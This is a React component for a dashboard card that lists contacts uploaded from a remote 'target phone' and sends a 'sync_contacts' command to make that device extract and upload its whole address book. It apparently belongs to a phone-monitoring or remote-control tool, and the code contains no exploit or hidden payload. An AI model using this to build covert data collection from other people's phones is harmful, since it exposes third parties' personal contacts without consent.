import { useEffect, useState, useMemo } from "react";
import { devicesApi } from "../api/devices";
import type { SavedContact, SavedContactsResponse } from "../api/types";

export default function SavedContactsCard({ deviceId }: { deviceId: string }) {
  const [data, setData] = useState<SavedContactsResponse>({
    contacts: [],
    total: 0,
    breakdown: { total: 0, sim: 0, google: 0, phone: 0 },
  });
  const [loading, setLoading] = useState(true);
  const [syncing, setSyncing] = useState(false);
  const [syncMessage, setSyncMessage] = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [activeFilter, setActiveFilter] = useState<"all" | "google" | "sim" | "phone">("all");
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const fetchContacts = async (silent = false) => {
    if (!silent) setLoading(true);
    try {
      const res = await devicesApi.contacts(deviceId);
      setData(res);
    } catch (err) {
      console.error("Failed to load saved contacts:", err);
    } finally {
      if (!silent) setLoading(false);
    }
  };

  useEffect(() => {
    fetchContacts();
    const interval = setInterval(() => {
      fetchContacts(true);
    }, 30000); // 30s background poll
    return () => clearInterval(interval);
  }, [deviceId]);

  const handleSyncNow = async () => {
    if (syncing) return;
    setSyncing(true);
    setSyncMessage("Dispatching sync command to target phone...");
    try {
      const cmd = await devicesApi.createCommand(deviceId, "sync_contacts");
      const cmdId = cmd?.id;

      if (cmdId) {
        for (let i = 0; i < 15; i++) {
          await new Promise((r) => setTimeout(r, 1200));
          try {
            const check = await devicesApi.getCommand(deviceId, cmdId);
            if (check.status === "acked") {
              setSyncMessage("Contacts successfully updated from target phone!");
              await fetchContacts(true);
              break;
            } else if (check.status === "failed") {
              setSyncMessage("Device reported: " + (check.result?.error || "Sync failed"));
              break;
            } else {
              setSyncMessage(`Waiting for phone pickup (${i + 1}/15)...`);
            }
          } catch (_: unknown) {}
        }
      }
      await fetchContacts(true);
    } catch (err) {
      setSyncMessage("Failed to send command: " + (err as Error).message);
    } finally {
      setTimeout(() => {
        setSyncing(false);
        setSyncMessage(null);
      }, 3000);
    }
  };

  const handleCopyNumber = (id: string, number: string) => {
    navigator.clipboard.writeText(number);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 1800);
  };

  // Filter contacts by search query & category tab
  const filteredContacts = useMemo(() => {
    let list = data.contacts || [];

    // Filter by storage type
    if (activeFilter === "google") {
      list = list.filter(
        (c) =>
          c.storage_type.includes("@") ||
          c.account_type.toLowerCase().includes("google") ||
          c.storage_type.toLowerCase().includes("google")
      );
    } else if (activeFilter === "sim") {
      list = list.filter(
        (c) =>
          c.storage_type.toLowerCase().includes("sim") ||
          c.account_type.toLowerCase().includes("sim") ||
          c.account_name.toLowerCase().includes("sim")
      );
    } else if (activeFilter === "phone") {
      list = list.filter(
        (c) =>
          c.storage_type.toLowerCase().includes("phone") ||
          c.storage_type.toLowerCase().includes("device") ||
          (!c.account_type && !c.account_name)
      );
    }

    // Filter by search query
    if (searchQuery.trim()) {
      const q = searchQuery.toLowerCase().trim();
      list = list.filter(
        (c) =>
          c.name.toLowerCase().includes(q) ||
          c.phone_number.toLowerCase().includes(q) ||
          c.storage_type.toLowerCase().includes(q) ||
          c.account_name.toLowerCase().includes(q)
      );
    }

    return list;
  }, [data.contacts, activeFilter, searchQuery]);

  // Storage badge helper with modern styling
  const renderStorageBadge = (contact: SavedContact) => {
    const st = contact.storage_type || "Phone Storage";
    const stLower = st.toLowerCase();
    const atLower = (contact.account_type || "").toLowerCase();

    // 1. Google / Email account
    if (st.includes("@") || atLower.includes("google") || stLower.includes("google")) {
      const displayEmail =
        contact.account_name && contact.account_name.includes("@")
          ? contact.account_name
          : st;

      return (
        <span
          className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-medium bg-blue-50 text-blue-700 border border-blue-200/90 shadow-2xs whitespace-nowrap"
          title={`Google Account: ${displayEmail}`}
        >
          <svg className="w-3.5 h-3.5 text-blue-600 shrink-0" fill="currentColor" viewBox="0 0 24 24">
            <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z" />
          </svg>
          <span className="font-semibold">{displayEmail}</span>
        </span>
      );
    }

    // 2. SIM Card
    if (stLower.includes("sim") || atLower.includes("sim") || (contact.account_name || "").toLowerCase().includes("sim")) {
      const isSim2 = stLower.includes("2") || (contact.account_name || "").toLowerCase().includes("2");
      return (
        <span
          className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-bold bg-emerald-50 text-emerald-800 border border-emerald-300 shadow-2xs whitespace-nowrap"
          title={`SIM Card: ${contact.account_name || st}`}
        >
          <svg className="w-3.5 h-3.5 text-emerald-600 shrink-0" fill="currentColor" viewBox="0 0 24 24">
            <path d="M19.99 4c0-1.1-.89-2-1.99-2h-8L4 8v12c0 1.1.9 2 2 2h12.01c1.1 0 1.99-.9 1.99-2l-.01-16zM9 19H7v-2h2v2zm8 0h-2v-2h2v2zm-4 0h-2v-2h2v2zm4-4h-2v-4h2v4zm-4 0h-2v-4h2v4zm-4 0H7v-4h2v4z" />
          </svg>
          <span>{isSim2 ? "SIM 2" : "SIM"}</span>
        </span>
      );
    }

    // 3. Phone / Internal Device Memory
    if (stLower.includes("phone") || stLower.includes("device") || (!contact.account_type && !contact.account_name)) {
      return (
        <span
          className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-semibold bg-amber-50 text-amber-900 border border-amber-200/90 shadow-2xs whitespace-nowrap"
          title="Stored in Phone Internal Storage"
        >
          <svg className="w-3.5 h-3.5 text-amber-600 shrink-0" fill="currentColor" viewBox="0 0 24 24">
            <path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z" />
          </svg>
          <span>Phone Storage</span>
        </span>
      );
    }

    // 4. WhatsApp or other 3rd party
    if (stLower.includes("whatsapp")) {
      return (
        <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-semibold bg-teal-50 text-teal-800 border border-teal-200 shadow-2xs whitespace-nowrap">
          <span>💬</span>
          <span>WhatsApp</span>
        </span>
      );
    }

    // 5. Fallback custom account
    return (
      <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-medium bg-gray-100 text-gray-700 border border-gray-200 shadow-2xs whitespace-nowrap">
        <span>📁</span>
        <span className="truncate max-w-[150px]">{st}</span>
      </span>
    );
  };

  // Avatar initials generator with rich, deterministic colors
  const getAvatarColor = (name: string) => {
    const colors = [
      "from-indigo-500 to-indigo-600",
      "from-sky-500 to-blue-600",
      "from-emerald-500 to-teal-600",
      "from-purple-500 to-indigo-600",
      "from-rose-500 to-pink-600",
      "from-amber-500 to-orange-600",
      "from-teal-500 to-cyan-600",
      "from-violet-500 to-purple-600",
    ];
    let hash = 0;
    for (let i = 0; i < name.length; i++) hash = name.charCodeAt(i) + ((hash << 5) - hash);
    const index = Math.abs(hash) % colors.length;
    return colors[index];
  };

  const getInitials = (name: string) => {
    if (!name) return "?";
    const parts = name.trim().split(/\s+/);
    if (parts.length >= 2) {
      return (parts[0][0] + parts[1][0]).toUpperCase();
    }
    return name.slice(0, 2).toUpperCase();
  };

  return (
    <div className="bg-white rounded-2xl shadow-sm border border-gray-200/90 overflow-hidden transition-all duration-200">
      {/* 1. Header Section */}
      <div className="p-6 border-b border-gray-100 bg-linear-to-r from-slate-50/70 via-indigo-50/30 to-white">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
          <div className="flex items-center gap-3.5">
            <div className="w-12 h-12 rounded-2xl bg-linear-to-tr from-indigo-600 to-blue-500 text-white flex items-center justify-center font-bold text-xl shadow-md shadow-indigo-500/20">
              📇
            </div>
            <div>
              <div className="flex items-center gap-2.5">
                <h2 className="text-xl font-bold text-gray-900 tracking-tight">Saved Contacts</h2>
                <span className="px-2.5 py-0.5 rounded-full text-xs font-bold bg-indigo-100 text-indigo-800 border border-indigo-200">
                  {data.total} Total
                </span>
              </div>
              <p className="text-xs text-gray-500 mt-1">
                Full address book snapshot with storage location (SIM, Google Mail, Phone Memory)
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2.5">
            <button
              onClick={handleSyncNow}
              disabled={syncing}
              className={`px-4 py-2 text-xs font-semibold rounded-xl border transition-all flex items-center gap-2 shadow-xs ${
                syncing
                  ? "bg-indigo-50 text-indigo-400 border-indigo-200 cursor-not-allowed"
                  : "bg-white text-indigo-700 border-indigo-200 hover:bg-indigo-50/80 hover:border-indigo-300 hover:shadow-sm"
              }`}
              title="Request target phone to extract and upload all contacts immediately"
            >
              <svg
                className={`w-3.5 h-3.5 ${syncing ? "animate-spin text-indigo-500" : "text-indigo-600"}`}
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={2.2}
                  d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"
                />
              </svg>
              <span>{syncing ? "Syncing with phone..." : "Sync Contacts Now"}</span>
            </button>
          </div>
        </div>

        {/* Sync message banner */}
        {syncMessage && (
          <div className="mt-4 text-xs px-3.5 py-2 rounded-xl bg-indigo-50/90 border border-indigo-200 text-indigo-800 font-medium flex items-center gap-2.5 animate-fadeIn">
            <span className="text-sm">ℹ️</span>
            <span>{syncMessage}</span>
          </div>
        )}

        {/* 2. Interactive Storage Stat Cards */}
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mt-5">
          {/* All Contacts Card */}
          <button
            type="button"
            onClick={() => setActiveFilter("all")}
            className={`p-3.5 rounded-xl border text-left transition-all cursor-pointer ${
              activeFilter === "all"
                ? "bg-indigo-600 text-white border-indigo-600 shadow-md shadow-indigo-600/20 scale-[1.02]"
                : "bg-white text-gray-700 border-gray-200 hover:border-indigo-300 hover:bg-indigo-50/40"
            }`}
          >
            <div className="flex items-center justify-between">
              <span className={`text-xs font-semibold ${activeFilter === "all" ? "text-indigo-100" : "text-gray-500"}`}>
                All Contacts
              </span>
              <span className="text-base">📇</span>
            </div>
            <div className="text-xl font-bold mt-1 tracking-tight">
              {data.breakdown.total}
            </div>
          </button>

          {/* Google / Mail Card */}
          <button
            type="button"
            onClick={() => setActiveFilter("google")}
            className={`p-3.5 rounded-xl border text-left transition-all cursor-pointer ${
              activeFilter === "google"
                ? "bg-blue-600 text-white border-blue-600 shadow-md shadow-blue-600/20 scale-[1.02]"
                : "bg-white text-gray-700 border-gray-200 hover:border-blue-300 hover:bg-blue-50/40"
            }`}
          >
            <div className="flex items-center justify-between">
              <span className={`text-xs font-semibold ${activeFilter === "google" ? "text-blue-100" : "text-blue-700"}`}>
                Google / Mail
              </span>
              <span className="text-base">📧</span>
            </div>
            <div className="text-xl font-bold mt-1 tracking-tight">
              {data.breakdown.google}
            </div>
          </button>

          {/* SIM Card */}
          <button
            type="button"
            onClick={() => setActiveFilter("sim")}
            className={`p-3.5 rounded-xl border text-left transition-all cursor-pointer ${
              activeFilter === "sim"
                ? "bg-emerald-600 text-white border-emerald-600 shadow-md shadow-emerald-600/20 scale-[1.02]"
                : "bg-white text-gray-700 border-gray-200 hover:border-emerald-300 hover:bg-emerald-50/40"
            }`}
          >
            <div className="flex items-center justify-between">
              <span className={`text-xs font-semibold ${activeFilter === "sim" ? "text-emerald-100" : "text-emerald-700"}`}>
                SIM Card
              </span>
              <span className="text-base">📱</span>
            </div>
            <div className="text-xl font-bold mt-1 tracking-tight">
              {data.breakdown.sim}
            </div>
          </button>

          {/* Phone Storage */}
          <button
            type="button"
            onClick={() => setActiveFilter("phone")}
            className={`p-3.5 rounded-xl border text-left transition-all cursor-pointer ${
              activeFilter === "phone"
                ? "bg-amber-600 text-white border-amber-600 shadow-md shadow-amber-600/20 scale-[1.02]"
                : "bg-white text-gray-700 border-gray-200 hover:border-amber-300 hover:bg-amber-50/40"
            }`}
          >
            <div className="flex items-center justify-between">
              <span className={`text-xs font-semibold ${activeFilter === "phone" ? "text-amber-100" : "text-amber-800"}`}>
                Phone Storage
              </span>
              <span className="text-base">💾</span>
            </div>
            <div className="text-xl font-bold mt-1 tracking-tight">
              {data.breakdown.phone}
            </div>
          </button>
        </div>

        {/* 3. Search Bar */}
        <div className="mt-4 flex flex-col sm:flex-row items-center justify-between gap-3">
          <div className="relative w-full">
            <span className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-gray-400">
              <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
              </svg>
            </span>
            <input
              type="text"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              placeholder="Search contact by name, phone number, email address..."
              className="w-full pl-10 pr-9 py-2 text-xs bg-white border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-indigo-500/25 focus:border-indigo-500 transition shadow-2xs"
            />
            {searchQuery && (
              <button
                onClick={() => setSearchQuery("")}
                className="absolute inset-y-0 right-0 pr-3 flex items-center text-gray-400 hover:text-gray-600 text-xs"
                title="Clear search"
              >
                ✕
              </button>
            )}
          </div>
        </div>
      </div>

      {/* 4. Table of Contacts */}
      <div className="overflow-x-auto max-h-[500px] overflow-y-auto scrollbar-thin scrollbar-thumb-gray-300">
        {loading ? (
          <div className="p-16 text-center text-gray-500 text-xs">
            <div className="inline-block animate-spin text-3xl mb-3">⏳</div>
            <p className="font-semibold text-gray-700">Loading saved contacts...</p>
          </div>
        ) : filteredContacts.length === 0 ? (
          <div className="p-16 text-center text-gray-500 text-xs">
            <div className="w-16 h-16 rounded-full bg-gray-100 flex items-center justify-center text-3xl mx-auto mb-3">
              📇
            </div>
            <p className="font-bold text-gray-800 text-sm">No contacts found</p>
            <p className="mt-1 text-gray-500 max-w-sm mx-auto">
              {searchQuery
                ? `No contacts matched "${searchQuery}" in this filter.`
                : "No saved contacts uploaded from this device yet."}
            </p>
            {!searchQuery && (
              <button
                onClick={handleSyncNow}
                disabled={syncing}
                className="mt-4 inline-flex items-center gap-2 px-4 py-2 bg-indigo-600 text-white rounded-xl text-xs font-semibold hover:bg-indigo-700 transition shadow-xs"
              >
                <span>🔄</span>
                <span>Click to Sync from Phone Now</span>
              </button>
            )}
          </div>
        ) : (
          <table className="w-full min-w-[760px] text-left text-xs border-collapse">
            <thead className="bg-gray-50/95 text-gray-600 font-semibold border-b border-gray-200 sticky top-0 z-10 backdrop-blur-xs">
              <tr>
                <th className="py-3 px-4 w-12 text-center text-[11px]">#</th>
                <th className="py-3 px-4 min-w-[200px]">Contact</th>
                <th className="py-3 px-4 min-w-[220px] whitespace-nowrap">Phone Number</th>
                <th className="py-3 px-4 w-24 whitespace-nowrap">Type</th>
                <th className="py-3 px-4 min-w-[240px] whitespace-nowrap">Storage Location</th>
                <th className="py-3 px-4 w-28 text-right whitespace-nowrap">Last Synced</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-gray-100/90">
              {filteredContacts.map((contact, idx) => (
                <tr
                  key={contact.id || idx}
                  className="hover:bg-indigo-50/40 transition-colors group"
                >
                  {/* Row index */}
                  <td className="py-3 px-4 text-center text-[11px] font-mono text-gray-400">
                    {idx + 1}
                  </td>

                  {/* Name + Avatar */}
                  <td className="py-3 px-4">
                    <div className="flex items-center gap-3">
                      <div
                        className={`w-8 h-8 rounded-full text-white flex items-center justify-center font-bold text-xs shrink-0 shadow-xs bg-linear-to-tr ${getAvatarColor(
                          contact.name
                        )}`}
                      >
                        {getInitials(contact.name)}
                      </div>
                      <div className="flex flex-col min-w-0">
                        <span className="font-semibold text-gray-900 group-hover:text-indigo-700 transition truncate max-w-[220px]">
                          {contact.name}
                        </span>
                      </div>
                    </div>
                  </td>

                  {/* Phone Number (NEVER breaks/wraps) */}
                  <td className="py-3 px-4 whitespace-nowrap">
                    <div className="inline-flex items-center gap-2 bg-gray-50 px-3 py-1.5 rounded-lg border border-gray-200/80 group-hover:bg-white group-hover:border-indigo-200 transition">
                      <svg className="w-3.5 h-3.5 text-gray-400 group-hover:text-indigo-600 shrink-0" fill="currentColor" viewBox="0 0 24 24">
                        <path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z" />
                      </svg>
                      <span className="font-mono text-gray-900 font-bold tracking-tight whitespace-nowrap text-xs">
                        {contact.phone_number}
                      </span>
                      <button
                        type="button"
                        onClick={() => handleCopyNumber(contact.id, contact.phone_number)}
                        className={`ml-1 px-1.5 py-0.5 rounded text-[10px] font-semibold transition flex items-center gap-1 ${
                          copiedId === contact.id
                            ? "bg-emerald-600 text-white"
                            : "bg-gray-200/80 hover:bg-indigo-600 hover:text-white text-gray-700"
                        }`}
                        title="Copy phone number"
                      >
                        {copiedId === contact.id ? (
                          <>
                            <span>✓</span>
                            <span>Copied</span>
                          </>
                        ) : (
                          <span>Copy</span>
                        )}
                      </button>
                    </div>
                  </td>

                  {/* Phone Type */}
                  <td className="py-3 px-4 whitespace-nowrap">
                    <span className="px-2.5 py-0.5 rounded-md text-[11px] font-medium bg-gray-100 text-gray-700 border border-gray-200/60">
                      {contact.phone_type || "Mobile"}
                    </span>
                  </td>

                  {/* Storage Location Badge */}
                  <td className="py-3 px-4 whitespace-nowrap">
                    {renderStorageBadge(contact)}
                  </td>

                  {/* Last Synced */}
                  <td className="py-3 px-4 text-right text-[11px] text-gray-400 whitespace-nowrap font-mono">
                    {contact.synced_at ? new Date(contact.synced_at).toLocaleDateString() : "Recently"}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </div>

      {/* 5. Footer Summary */}
      {filteredContacts.length > 0 && (
        <div className="p-4 border-t border-gray-100 bg-gray-50/70 flex flex-col sm:flex-row items-center justify-between text-xs text-gray-600 gap-3">
          <div>
            Showing <strong className="text-gray-900 font-bold">{filteredContacts.length}</strong> of{" "}
            <strong className="text-gray-900 font-bold">{data.total}</strong> total saved contacts
          </div>
          <div className="flex items-center gap-4 text-xs">
            <span className="flex items-center gap-1.5 font-medium">
              <span className="w-2.5 h-2.5 rounded-full bg-blue-500 shadow-2xs"></span>
              Google/Mail: <strong className="text-gray-900">{data.breakdown.google}</strong>
            </span>
            <span className="flex items-center gap-1.5 font-medium">
              <span className="w-2.5 h-2.5 rounded-full bg-emerald-500 shadow-2xs"></span>
              SIM: <strong className="text-gray-900">{data.breakdown.sim}</strong>
            </span>
            <span className="flex items-center gap-1.5 font-medium">
              <span className="w-2.5 h-2.5 rounded-full bg-amber-500 shadow-2xs"></span>
              Phone: <strong className="text-gray-900">{data.breakdown.phone}</strong>
            </span>
          </div>
        </div>
      )}
    </div>
  );
}
